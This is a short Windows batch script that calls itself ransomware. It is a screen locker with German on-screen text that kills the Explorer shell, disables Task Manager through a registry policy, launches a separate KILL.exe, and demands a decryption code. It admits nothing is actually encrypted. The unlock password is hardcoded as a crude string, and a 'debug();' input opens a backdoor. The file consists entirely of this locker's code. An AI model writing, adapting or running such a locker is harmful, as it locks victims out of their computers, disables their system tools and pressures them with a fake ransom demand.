@echo off
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\KILL.exe
taskkill /f /im explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
title S#itty Ransomware V0.5d
color 1
cls
goto :text2

:text
cls
echo Falscher Decryption Key!

::copy pasta
:text2
echo.
echo sorry, PC ist wieder mal wiedermal gesperrt.
echo diesmal aber etwas strenger und !besserem code.
echo PC ist immernoch net encrypted weil (immernoch)
echo zu viel Arbeit.
echo Das Program ist immernoch im startup drinne :D
echo Task-Manager ist vielleicht blockiert, aber ka weil
echo janky code lol
echo Der Encryption Key ist NICHT der Decryption Code
echo /J
echo.
echo dein Encryption-Key: 
echo UGFzc3dvcnQ6 
echo.
echo.
echo Decryption-Code Eingabe:

::input shit
set /p input=">>>":
if "%input%" == "G4yFurryPr0n" goto :end
if "%input%" == "debug();" goto dev:

::loopback if incorrect
goto :text

::correct password
:end
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\cleaner.bat
exit

::debug terminal
:dev
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\debug.bat
cls
goto :text2